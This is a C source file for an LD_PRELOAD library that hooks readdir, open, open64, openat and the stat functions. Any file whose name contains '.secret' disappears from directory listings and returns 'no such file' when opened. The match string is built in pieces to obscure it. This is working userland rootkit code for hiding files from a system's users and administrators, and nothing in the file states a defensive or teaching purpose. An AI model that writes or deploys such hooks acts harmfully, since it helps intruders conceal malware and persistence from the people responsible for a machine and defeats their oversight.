#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/stat.h>

// Simple check for the secret filename
static int is_hidden(const char *p) {
    char h[16];
    strcpy(h, ".sec");
    strcat(h, "ret");
    return (p && strstr(p, h));
}

// readdir hook: Hides the file from directory listings (ls)
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (is_hidden(e->d_name)) continue;
        return e;
    }
    return NULL;
}

// open hook: Blocks access via cat, echo, etc.
int open(const char *p, int f, ...) {
    static int (*orig)(const char *, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open");
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    if (f & O_CREAT) {
        va_list a; va_start(a, f);
        mode_t m = va_arg(a, mode_t); va_end(a);
        return orig(p, f, m);
    }
    return orig(p, f);
}

int open64(const char *p, int f, ...) {
    static int (*orig)(const char *, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open64");
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    if (f & O_CREAT) {
        va_list a; va_start(a, f);
        mode_t m = va_arg(a, mode_t); va_end(a);
        return orig(p, f, m);
    }
    return orig(p, f);
}

int openat(int d, const char *p, int f, ...) {
    static int (*orig)(int, const char *, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "openat");
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    if (f & O_CREAT) {
        va_list a; va_start(a, f);
        mode_t m = va_arg(a, mode_t); va_end(a);
        return orig(d, p, f, m);
    }
    return orig(d, p, f);
}

// stat hooks: Hides metadata for 'ls -l'
int __xstat(int v, const char *p, struct stat *s) {
    static int (*orig)(int, const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "__xstat");
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig(v, p, s);
}

int __xstat64(int v, const char *p, struct stat64 *s) {
    static int (*orig)(int, const char *, struct stat64 *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "__xstat64");
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig(v, p, s);
}